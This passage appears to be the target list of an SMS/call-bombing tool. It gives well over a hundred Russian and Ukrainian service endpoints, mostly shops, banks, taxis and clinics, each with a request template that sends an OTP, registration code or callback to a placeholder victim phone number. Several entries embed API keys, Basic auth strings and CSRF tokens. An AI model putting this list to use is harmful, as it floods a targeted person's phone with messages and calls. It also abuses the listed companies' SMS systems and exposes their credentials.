URL https://www.ozon.ru/api/composer-api.bx/_action/fastEntry
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}","otpId":0}
END

SERVICE lenta:Lenta:7
URL https://lenta.com/api/v1/authentication/requestValidationCode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+7{phone}"}
END

SERVICE gurutaxi:GuruTaxi:7
URL https://guru.taxi/api/v1/driver/session/verify
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":{"code":1,"number":"{phone}"}}
END

SERVICE delitime:Delitime:7
URL https://api.delitime.ru/api/v2/signup
METHOD POST
CONTENT_TYPE form
DATA SignupForm[username]=+7{phone}
DATA SignupForm[device_type]=3
END

SERVICE carsmile:Carsmile:7
URL https://api.carsmile.com/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"operationName":"enterPhone","variables":{"phone":"+7{phone}"},"query":"mutation enterPhone($phone: String!) { enterPhone(phone: $phone)}"}
END

SERVICE sovest:Sovest:7
URL https://oauth.sovest.ru/oauth/authorize
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE gorzdrav:Gorzdrav:7
URL https://gorzdrav.org/login/register/sms/send
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
END

SERVICE sportmaster_ru:SportmasterRU:7
URL https://www.sportmaster.ru/user/session/sendSmsCode.do?phone=+{phone}&_=1580559110407
METHOD GET
CONTENT_TYPE params
END

SERVICE playfamily:Playfamily:7
URL https://ctx.playfamily.ru/screenapi/v3/sendsmscode/web/1
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
DATA password={password}
END

SERVICE pozvonim:Pozvonim:7
URL https://my.pozvonim.com/api/v1/auth/send/sms
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
DATA origin=https://my.pozvonim.com
DATA referer=https://my.pozvonim.com/register/
DATA host=my.pozvonim.com
END

SERVICE sipnet:Sipnet:7
URL https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone={phone}
METHOD GET
CONTENT_TYPE params
HEADER Referer: https://www.sipnet.ru/register
HEADER Origin: https://www.sipnet.ru
END

SERVICE mvideo:Mvideo:7
URL https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp
METHOD POST
CONTENT_TYPE form
DATA phone={phone_formatted}
DATA g-recaptcha-response=
DATA recaptcha=on
PARAM pageName=loginByUserPhoneVerification
PARAM fromCheckout=false
PARAM fromRegisterPage=true
PARAM snLogin=
PARAM bpg=
PARAM snProviderId=
END

SERVICE newnext:Newnext:7
URL https://newnext.ru/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"operationName":"registration","variables":{"client":{"firstName":"Иван","lastName":"Иванов","phone":"+7{phone}","typeKeys":["Unemployed"]}},"query":"mutation registration($client: ClientInput!) {\\n  registration(client: $client) {\\n    token\\n    __typename\\n  }\\n}\\n"}
END

SERVICE alpari_json:AlpariJSON:7
URL https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"client_type":"personal","email":"test@test.com","mobile_phone":"+7{phone}","deliveryOption":"sms"}
END

SERVICE smsgorod:Smsgorod:7
URL http://smsgorod.ru/sendsms.php
METHOD POST
CONTENT_TYPE form
DATA number=+7{phone}
END

SERVICE deliveryclub:DeliveryClub:7
URL https://www.delivery-club.ru/ajax/user_otp
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE youdo:YouDo:7
URL https://youdo.com/api/verification/sendverificationcode/
METHOD POST
CONTENT_TYPE form
DATA PhoneE164=+7{phone}
END

SERVICE citilink:Citilink:7
URL https://www.citilink.ru/registration/confirm/phone/+{phone}/
METHOD POST
CONTENT_TYPE form
END

SERVICE gett:Gett:7
URL https://driver.gett.ru/api/login/phone/
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
DATA registration=true
HEADER X-CSRFToken={csrf_token}
HEADER Referer: https://driver.gett.ru/signup/
END

SERVICE ivi_api:IVIAPI:7
URL https://api.ivi.ru/mobileapi/user/register/phone/v6/
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
HEADER Referer: https://www.ivi.ru/profile
HEADER Origin: https://www.ivi.ru/
END

SERVICE drugvokrug:Drugvokrug:7
URL https://drugvokrug.ru/siteActions/processSms.htm
METHOD POST
CONTENT_TYPE form
DATA cell={phone}
HEADER X-Requested-With: XMLHttpRequest
HEADER Referer: https://drugvokrug.ru/
END

SERVICE psbank:PSBank:7
URL https://ib.psbank.ru/api/authentication/extendedClientAuthRequest
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"firstName":"Иван","middleName":"Иванович","lastName":"Иванов","sex":"1","birthDate":"10.10.2000","mobilePhone":"{phone}","russianFederationResident":"true","isDSA":"false","personalDataProcessingAgreement":"true","bKIRequestAgreement":"null","promotionAgreement":"true"}
END

SERVICE apteka_form:AptekaRU:7
URL https://apteka.ru/_action/auth/getForm/
METHOD POST
CONTENT_TYPE form
DATA form[NAME]=Иван
DATA form[PERSONAL_GENDER]=M
DATA form[PERSONAL_BIRTHDAY]=11.02.2000
DATA form[EMAIL]=test@gmail.com
DATA form[LOGIN]={phone_formatted}
DATA form[PASSWORD]=
DATA get-new-password=Получите пароль по SMS
DATA user_agreement=on
DATA personal_data_agreement=on
DATA formType=full
DATA utc_offset=180
END

SERVICE tvzavr:TVZavr:7
URL https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone={phone}&csrf_value=a222ba2a464543f5ac6ad097b1e92a49
METHOD POST
CONTENT_TYPE form
END

SERVICE netprint:Netprint:7
URL https://www.netprint.ru/order/social-auth
METHOD POST
CONTENT_TYPE form
DATA operation=stdreg
DATA email_or_phone={phone_formatted}
DATA i_agree_with_terms=1
HEADER X-Requested-With: XMLHttpRequest
HEADER Referer: https://www.netprint.ru/order/profile
HEADER Origin: https://www.netprint.ru
END

SERVICE youdrive:YouDrive:7
URL http://youdrive.today/login/web/phone
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
DATA phone_code=7
END

SERVICE oyorooms_ru:Oyorooms:7
URL https://www.oyorooms.com/api/pwa/generateotp?phone={phone}&country_code=%2B7&nod=4&locale=en
METHOD GET
CONTENT_TYPE params
END

SERVICE qlean_api:Qlean:7
URL https://qlean.ru/clients-api/v2/sms_codes/auth/request_code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

SERVICE vkusvill:VkusVill:7
URL https://mobile.vkusvill.ru:40113/api/user/
METHOD POST
CONTENT_TYPE form
DATA Phone_number={phone}
DATA version=2
HEADER Accept: application/json
END

SERVICE taxiseven:TaxiSeven:7
URL http://taxiseven.ru/auth/register
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE wildberries:Wildberries:7
URL https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

SERVICE fastmoney:FastMoney:7
URL https://fastmoney.ru/auth/registration
METHOD POST
CONTENT_TYPE form
DATA RegistrationForm[username]=+7{phone}
DATA RegistrationForm[password]=12345
DATA RegistrationForm[confirmPassword]=12345
DATA yt0=Регистрация
END

SERVICE mos_ru:MosRU:7
URL https://login.mos.ru/sps/recovery/start
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"login": "+7{phone}", "attr": ""}
END

SERVICE comfy_ua:ComfyUA:380
URL https://comfy.ua/ua/customer/account/createPost
METHOD POST
CONTENT_TYPE form
DATA registration_name=Олег
DATA registration_phone=+380{phone}
DATA registration_email=test@test.com
END

SERVICE allo:Allo:380
URL https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA
METHOD POST
CONTENT_TYPE form
DATA firstname=Олег
DATA telephone=+380{phone}
DATA email=test@test.com
DATA password=test123
DATA form_key=Zqqj7CyjkKG2ImM8
END

SERVICE sportmaster_ua:SportmasterUA:380
URL https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+380{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE online_ua:OnlineUA:380
URL https://secure.online.ua/ajax/check_phone/?reg_phone=380{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE pampik:Pampik:380
URL https://pampik.com/callback
METHOD POST
CONTENT_TYPE form
DATA phoneCallback=+380{phone}
END

SERVICE junker:Junker:380
URL https://junker.kiev.ua/postmaster.php
METHOD POST
CONTENT_TYPE form
DATA tel=+380{phone}
DATA name=Олег
DATA action=callme
END

SERVICE pestocafe:PestoCafe:380
URL https://www.pestocafe.ua/apply-form/callback
METHOD POST
CONTENT_TYPE form
DATA name=Олег
DATA phone=+380{phone}
END

SERVICE mobileplanet:MobilePlanet:380
URL https://mobileplanet.ua/register
METHOD POST
CONTENT_TYPE form
DATA klient_name=Олег
DATA klient_phone=+380{phone}
DATA klient_email=test@test.com
END

SERVICE mobileplanet_cb:MobilePlanetCB:380
URL https://mobileplanet.ua/new_record
METHOD POST
CONTENT_TYPE form
DATA klient_name=Олег
DATA klient_phone=+380{phone}
DATA object=callback
END

SERVICE advice:Advice:380
URL http://www.advice.in.ua/vasha-zayavka-prinyata.html/
METHOD POST
CONTENT_TYPE form
DATA fio=Олег
DATA tel=+380{phone}
DATA type=2
END

SERVICE holdyou:HoldYou:380
URL https://holdyou.net/api/callback
METHOD POST
CONTENT_TYPE form
DATA name=Олег
DATA phone=+380{phone}
END

SERVICE city24:City24:380
URL https://city24.ua/personalaccount/account/registration
METHOD POST
CONTENT_TYPE form
DATA PhoneNumber=+380{phone}
END

SERVICE dianet:Dianet:380
URL https://my.dianet.com.ua/send_sms/
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
END

SERVICE easypay:EasyPay:380
URL https://api.easypay.ua/api/auth/register
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
DATA password=test123
END

SERVICE eldorado:Eldorado:380
URL https://api.eldorado.ua/v1/sign?login=380{phone}&step=phone-check&fb_id=null&fb_token=null&lang=ru
METHOD GET
CONTENT_TYPE params
END

SERVICE getmancar:GetManCar:380
URL https://crm.getmancar.com.ua/api/veryfyaccount
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}","grant_type":"password","client_id":"gcarAppMob","client_secret":"SomeRandomCharsAndNumbersMobile"}
END

SERVICE helsi:Helsi:380
URL https://helsi.me/api/healthy/accounts/login
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
DATA platform=PISWeb
END

SERVICE hmara:Hmara:380
URL https://api.hmara.tv/stable/entrance?contact=380{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE izi:Izi:380
URL https://izi.ua/api/auth/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}","name":"Олег","is_terms_accepted":true}
END

SERVICE izi_login:IziLogin:380
URL https://izi.ua/api/auth/sms-login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE kinoland:Kinoland:380
URL https://api.kinoland.com.ua/api/v1/service/send-sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Agent: website
BODY {"Phone":"380{phone}","Type":1}
END

SERVICE loany:Loany:380
URL https://loany.com.ua/funct/ajax/registration/code
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
END

SERVICE menu_ua:MenuUA:380
URL https://www.menu.ua/kiev/delivery/registration/direct-registration.html
METHOD POST
CONTENT_TYPE form
DATA user_info[phone]=+380{phone}
DATA user_info[fullname]=Олег
DATA user_info[email]=test@test.com
END

SERVICE menu_ua_verify:MenuUAVerify:380
URL https://www.menu.ua/kiev/delivery/profile/show-verify.html
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
DATA do=phone
END

SERVICE monobank:Monobank:380
URL https://www.monobank.com.ua/api/mobapplink/send
METHOD POST
CONTENT_TYPE form
DATA phone=+380{phone}
END

SERVICE rieltor:Rieltor:380
URL https://rieltor.ua/api/users/register-sms/
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
DATA retry=0
END

SERVICE tehnosvit:Tehnosvit:380
URL https://tehnosvit.ua/iwantring_feedback.html
METHOD POST
CONTENT_TYPE form
DATA feedbackName=Олег
DATA feedbackPhone=+380{phone}
END

SERVICE doc_ua:DocUA:380
URL https://doc.ua/main/callbackrequest
METHOD POST
CONTENT_TYPE form
DATA crm_models_SupportRequest[user_name]=Олег
DATA crm_models_SupportRequest[user_phone]=+380{phone}
END

SERVICE citrus:Citrus:380
URL https://my.citrus.ua/api/v2/register
METHOD POST
CONTENT_TYPE form
DATA email=test@test.com
DATA name=Олег
DATA phone=380{phone}
END

SERVICE kasta:Kasta:380
URL https://kasta.ua/api/v2/login/
METHOD POST
CONTENT_TYPE form
DATA phone=380{phone}
END

SERVICE taxi707:Taxi707:380
URL https://707taxi.com.ua/sendSMS.php
METHOD POST
CONTENT_TYPE form
DATA tel=380{phone}
END

SERVICE protovar:Protovar:380
URL https://protovar.com.ua/aj_record
METHOD POST
CONTENT_TYPE form
DATA object=callback
DATA user_name=Олег
DATA contact_phone=+380{phone}
END

SERVICE evse:EVse:380
URL https://e-vse.online/mail2.php
METHOD POST
CONTENT_TYPE form
DATA object=callback
DATA user_name=Олег
DATA contact_phone=+380{phone}
END

SERVICE uklon:Uklon:380
URL https://uklon.com.ua/api/v1/account/code/send
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER client_id: 6289de851fc726f887af8d5d7a56c635
BODY {"phone":"380{phone}"}
END

SERVICE uklon_partner:UklonPartner:380
URL https://partner.uklon.com.ua/api/v1/registration/sendcode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER client_id: 6289de851fc726f887af8d5d7a56c635
BODY {"phone":"380{phone}"}
END

SERVICE planetakino:PlanetaKino:380
URL https://cabinet.planetakino.ua/service/sms?phone=380{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE sushi_history:SushiHistory:380
URL https://ua.sushistory.com/user/phone/validate
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: en-US,en;q=0.9
BODY {"phone":"+380{phone}","numbers":4}
END

SERVICE meest:Meest:380
URL https://24.meest.com/api/v1/login?lang=uk
METHOD POST
CONTENT_TYPE form
HEADER Accept: application/json, text/plain, */*
HEADER Accept-Language: en-US,en;q=0.9
HEADER Content-Type: application/x-www-form-urlencoded
HEADER Authorization: Bearer null
DATA login={phone}
DATA clientID=GA1.1.1029175316.1724770479
END

SERVICE kyivstar:Kyivstar:380
URL https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk
METHOD POST
CONTENT_TYPE json
HEADER Accept: application/json
HEADER Accept-Language: en-US,en;q=0.9
HEADER Content-Type: application/json
BODY {"login":"380{phone}","captcha":null,"action":"registration","sid":"nkw"}
END

SERVICE varus:Varus:380
URL https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua
METHOD POST
CONTENT_TYPE json
HEADER accept: */*
HEADER accept-language: en-US,en;q=0.9
HEADER cache-control: no-cache
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE moyo:Moyo:380
URL https://www.moyo.ua/identity/registration
METHOD POST
CONTENT_TYPE form
HEADER accept: */*
HEADER accept-language: en-US,en;q=0.9
HEADER content-form-data: 251b2615b913e59efbd8165f4530a630
HEADER content-type: application/x-www-form-urlencoded; charset=UTF-8
HEADER x-requested-with: XMLHttpRequest
DATA firstname=Олег
DATA phone=+380{phone}
DATA email=test@test.com
END

SERVICE apteka_ds:AptekaDS:380
URL https://api-azure-prod.apteka-ds.com.ua/api/v2/account/exists/+380{phone}
METHOD GET
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: en-US,en;q=0.9
HEADER x-api-key: d8c8e5555fe21d34aeac416e79f1b6747b103d49eb980c7863210357627ca3a3bc55a5a69efac98010daba5a451c5ab74d1b91badb91bcac3fde02560e391ac09e5d976b7fc3ddcd6eb2564f79d6035bec5a21281c1bc3d041dbbe7e9ad30358476def143b7156692186488c9d979403ef4590b2888a3b1046394e9024d8cf78
END

SERVICE ucb:UCB:380
URL https://ucb.z.apteka24.ua/api/send/otp
METHOD POST
CONTENT_TYPE json
HEADER accept: */*
HEADER accept-language: en-US,en;q=0.9
HEADER authorization: Basic dWNiOkRvbnRNZWRkbGVIZXJlRG9nLg==
HEADER content-type: application/json; charset=utf-8
BODY {"phone":"380{phone}"}
END

SERVICE apteki:Apteki:380
URL https://suitecrm.morion.ua/service/v4_1/rest.php
METHOD POST
CONTENT_TYPE form
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/x-www-form-urlencoded
DATA method=sms
DATA input_type=JSON
DATA response_type=JSON
DATA rest_data={"phone":"380{phone}","app_id":"apteki","sms":"registration"}
END

SERVICE h24_reg:H24:380
URL https://ehr.h24.ua/api/v2/phone_call_sessions
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json
HEADER accept-language: uk
HEADER content-type: application/json
BODY {"phone_number":"+380{phone}"}
END

SERVICE sushi_drive:SushiDrive:380
URL https://souspizza.com/api/customer/auth
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
HEADER frontend-version: 0.6.2
BODY {"phone":"380{phone}","count":0,"utm":{}}
END

SERVICE lovilave:Lovilave:380
URL https://lovilave.com.ua/v2/sign/request
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: uk
HEADER baggage: sentry-environment=production,sentry-release=main-26.1.1-1,sentry-public_key=176bf3714d98e992773aaa42b80e5e9a,sentry-trace_id=be162e66e5d34d4a9a1d7c1dc6ea7f6a
HEADER cache-timeout: 0
HEADER content-type: application/json
HEADER sentry-trace: be162e66e5d34d4a9a1d7c1dc6ea7f6a-83779e508eff68a2
BODY {"phone":"+380{phone}"}
END

SERVICE ctrs:CTRS:380
URL https://my.ctrs.com.ua/api/v2/signup
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
HEADER x-app-token: yF27jwg5orUVo4abrops
HEADER x-locale: uk
BODY {"name":"Олег","phone":"380{phone}","email":"test@test.com"}
END

SERVICE comfy:Comfy:380
URL https://im.comfy.ua/api/auth/v3/otp/send
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
HEADER x-ray-id: web
HEADER x-session-id: web
BODY {"phone":"380{phone}"}
END

SERVICE tefal:Tefal:380
URL https://shop.tefal.ua/graphql
METHOD POST
CONTENT_TYPE json
HEADER accept: */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER authorization: Bearer
HEADER content-type: application/json
HEADER store: ua
HEADER x-magento-protection: Pu5BgoprURgEpOoJcecrzWZc25cPnIIG
BODY {"operationName":"generateSmsRegistrationCode","variables":{"firstname":"Олег","lastname":"Тест","phone":"+380{phone}","email":"test@test.com","token":null},"query":"mutation generateSmsRegistrationCode($firstname: String!, $lastname: String!, $phone: String!, $email: String!, $token: String) {\\n  generateSmsRegistrationCode(firstname: $firstname, lastname: $lastname, phone: $phone, email: $email, token: $token) {\\n    message\\n    status\\n    authentication\\n    __typename\\n  }\\n}\\n"}
END

SERVICE prostor:Prostor:380
URL https://prostor.ua/ua/prostor_customer/account/sendOtp/
METHOD POST
CONTENT_TYPE form
HEADER accept: */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: multipart/form-data; boundary=----WebKitFormBoundaryUILaOfjmr1N9x0wR
HEADER x-requested-with: XMLHttpRequest
DATA phone_number={phone}
DATA form_key=OlzwFqHhkqnZw8G9
END

SERVICE la:LA:380
URL https://la.ua/wp-admin/admin-ajax.php?lang=uk
METHOD POST
CONTENT_TYPE form
HEADER accept: */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/x-www-form-urlencoded; charset=UTF-8
HEADER x-requested-with: XMLHttpRequest
DATA action=user_login
DATA formData=tel=+380{phone}&code=
DATA nonce=dfd9779825
END

SERVICE cosmy:Cosmy:380
URL https://cosmy.com.ua/index.php?route=octemplates/module/oct_popup_login/login_tel
METHOD POST
CONTENT_TYPE form
HEADER accept: application/json, text/javascript, */*; q=0.01
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/x-www-form-urlencoded; charset=UTF-8
HEADER x-requested-with: XMLHttpRequest
DATA telephone=+380{phone}
END

SERVICE shop_kyivstar:ShopKyivstar:380
URL https://shop.kyivstar.ua/api/v2/otp_login/send/{phone}
METHOD GET
CONTENT_TYPE json
HEADER Accept: application/json, text/plain, */*
HEADER Accept-Language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER sec-ch-ua: Not(A:Brand;v=8, Chromium;v=144, Google Chrome;v=144
HEADER sec-ch-ua-mobile: ?0
HEADER sec-ch-ua-platform: macOS
END

SERVICE pandora:Pandora:380
URL https://back.e-pandora.ua/api/auth/register/verification
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
HEADER x-localization: ua
HEADER x-bot-request: No
BODY {"first_name":"Олег","phone":"{phone}","skip_phone_check":false}
END

SERVICE dnipro:DniproM:380
URL https://dnipro-m.ua/phone-verification/
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json;charset=UTF-8
HEADER x-csrf-token: TE0NUgeCrldn5LAIHfhFuJ-JVyHN8jD2M2kENATGkuF1Hm4jQq_IMlSB939CnSvT978dZfqbYJV9BkZmV_DxrQ==
HEADER x-requested-with: XMLHttpRequest
BODY {"phone":"380{phone}"}
END

SERVICE estro:Estro:380
URL https://estro.ua/api/auth/code/send/for-new
METHOD POST
CONTENT_TYPE json
HEADER accept: */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
HEADER x-csrf-token: zP6vCcwvEzdOYnkWOd4VNU9M2Ac1R09hRX4Cp4Tz
HEADER x-requested-with: XMLHttpRequest
BODY {"phone_number":"+380{phone}"}
END

SERVICE navse:NaVse:380
URL https://api.creditkasa.ua/public/auth/sendAcceptanceCode?productGroup=INSTALLMENT&phone={phone}&brandName=NaVse
METHOD GET
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
END

SERVICE pavluks:Pavluks:380
URL https://admin.pavluks-trans.com/api/auth/v2/register
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"380{phone}","name":"Олег","email":"test@test.com","password":"test123TZ","getNews":false}
END

SERVICE kabanchik:Kabanchik:380
URL https://kabanchik.ua/api/v3/registration/verify_phone/performer
METHOD POST
CONTENT_TYPE json
HEADER accept: */*
HEADER accept-language: uk
HEADER content-type: application/json; charset=utf-8
HEADER x-requested-with: XMLHttpRequest
BODY {"first_name":"Олег","is_company":false,"email":"test@test.com","region_id":27,"phone":"380{phone}","agreement":true,"social":null}
END

SERVICE retromagaz:RetroMagaz:380
URL https://retromagaz.com/login/phone
METHOD POST
CONTENT_TYPE form
HEADER accept: */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/x-www-form-urlencoded; charset=UTF-8
HEADER x-csrf-token: yLhIrEceFJFsFPJPOovw3wsQinufTGx0qZXFtTWZ
HEADER x-requested-with: XMLHttpRequest
DATA phone=+380{phone}
END

SERVICE stolychna:Stolychna:380
URL https://stolychnashop.com.ua/ajax/?execute=sendCodeVerification
METHOD POST
CONTENT_TYPE json
HEADER accept: */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"typeCode":"auth","phone":"+380{phone}"}
END

SERVICE craina:Craina:380
URL https://www.tous.com/ua-uk/ajax/common.php
METHOD POST
CONTENT_TYPE form
HEADER accept: application/json, text/javascript, */*; q=0.01
HEADER accept-language: en-US,en;q=0.9,uk;q=0.8
HEADER content-type: application/x-www-form-urlencoded; charset=UTF-8
HEADER x-requested-with: XMLHttpRequest
DATA handler=auth
DATA func=getRegister
DATA form[backurl]=/ua-uk/auth/
DATA form[lang]=ua
DATA form[LAST_NAME]=Тест
DATA form[NAME]=Олег
DATA form[SECOND_NAME]=Іванович
DATA form[BIRTHDAY_DD]=01
DATA form[BIRTHDAY_MM]=09
DATA form[BIRTHDAY_AAAA]=2000
DATA form[EMAIL]=test@test.com
DATA form[PHONE]=+380{phone}
DATA form[PASSWORD]=test123
DATA form[CONFIRM_PASSWORD]=test123
DATA form[PERSONAL_DATA]=1
DATA form[TREATMENT]=1
END

SERVICE tascombank:Tascombank:380
URL https://tas2u.tascombank.ua/api/v1/user
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: uk_UA
HEADER authorization: Basic NjJmMTNkNjYtZmRiNy00ZDk4LWJiMDAtOTFhNWFjMDdmNmM3OmY4YzRmMTMwODBiNDFkMmNkN2ViZmE5ZWM0NzY1MzRjNmVjODFmMGVkNDg1ZTBiOA==
HEADER content-type: application/json
BODY {"username":"380{phone}"}
END

SERVICE robota:Robota:380
URL https://dracula.robota.ua/?q=SendOtpCode
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: uk
HEADER apollographql-client-name: web-alliance-desktop
HEADER apollographql-client-version: 3aa78be
HEADER content-type: application/json
BODY {"operationName":"SendOtpCode","variables":{"phone":"380{phone}"},"query":"mutation SendOtpCode($phone: String!) {\\n  users {\\n    login {\\n      otpLogin {\\n        sendConfirmation(phone: $phone) {\\n          status\\n          remainingAttempts\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n"}
END

SERVICE unex:Unex:380
URL https://ib.unex.ua/api/v1/otp/generate
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}","otpType":"REGISTRATION"}
END

SERVICE dominos:Dominos:380
URL https://dominos.ua/api/auth/phone/verify
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"380{phone}"}
END

SERVICE inbus:InBus:380
URL https://inbus.com.ua/api/v1/auth/registration
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
HEADER content-type: application/json
BODY {"phone":"+380{phone}"}
END

SERVICE bustor:Bustor:380
URL https://bustor.com.ua/api/auth/send-sms
METHOD POST
CONTENT_TYPE json
HEADER accept: application/json, text/plain, */*
HEADER accept-language: ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3
